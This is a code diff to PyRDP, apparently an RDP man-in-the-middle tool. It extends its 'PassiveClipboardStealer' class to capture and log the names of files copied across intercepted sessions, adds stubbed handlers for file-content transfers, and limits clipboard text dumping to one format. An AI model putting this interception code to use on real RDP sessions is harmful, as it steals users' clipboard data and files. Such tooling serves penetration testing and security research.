@@ -10,7 +10,7 @@ from pyrdp.core import decodeUTF16LE
 from pyrdp.enum import ClipboardFormatNumber, ClipboardMessageFlags, ClipboardMessageType, PlayerPDUType
 from pyrdp.layer import ClipboardLayer
 from pyrdp.logging.StatCounter import StatCounter, STAT
-from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU, FormatListPDU
+from pyrdp.pdu import ClipboardPDU, FormatDataRequestPDU, FormatDataResponsePDU, FormatListPDU, FileContentsRequestPDU, FileContentsResponsePDU
 from pyrdp.recording import Recorder
 
 
@@ -33,6 +33,7 @@ class PassiveClipboardStealer:
         self.log = log
         self.recorder = recorder
         self.forwardNextDataResponse = True
+        self.files = []
 
         self.client.createObserver(
             onPDUReceived = self.onClientPDUReceived,
@@ -57,6 +58,15 @@ class PassiveClipboardStealer:
         :param destination: the destination layer
         """
 
+        if isinstance(pdu, FileContentsRequestPDU):
+            # TODO: Add to pending request map
+            print('File Contents Request')
+            pass
+        if isinstance(pdu, FileContentsResponsePDU):
+            # TODO: Retrieve pending request and append/update data.
+            print('File Contents Response')
+            pass
+
         if not isinstance(pdu, FormatDataResponsePDU):
             destination.sendPDU(pdu)
         else:
@@ -64,9 +74,19 @@ class PassiveClipboardStealer:
                 destination.sendPDU(pdu)
 
             if pdu.msgFlags == ClipboardMessageFlags.CB_RESPONSE_OK:
-                clipboardData = self.decodeClipboardData(pdu.requestedFormatData)
-                self.log.info("Clipboard data: %(clipboardData)r", {"clipboardData": clipboardData})
-                self.recorder.record(pdu, PlayerPDUType.CLIPBOARD_DATA)
+                # Keep the file list if there is one.
+                if len(pdu.files) > 0:
+                    self.files = pdu.files
+                    self.log.info('---- Clipboard Files ----')
+                    for f in self.files:
+                        self.log.info(f.filename)
+                    self.log.info('-------------------------')
+
+                # FIXME: Only dump clipboard data for generic format id?
+                if pdu.formatId == 0xD:  # GENERIC only.
+                    clipboardData = self.decodeClipboardData(pdu.requestedFormatData)
+                    self.log.info("Clipboard data: %(clipboardData)r", {"clipboardData": clipboardData})
+                    self.recorder.record(pdu, PlayerPDUType.CLIPBOARD_DATA)
 
                 if self.forwardNextDataResponse:
                     # Means it's NOT a crafted response
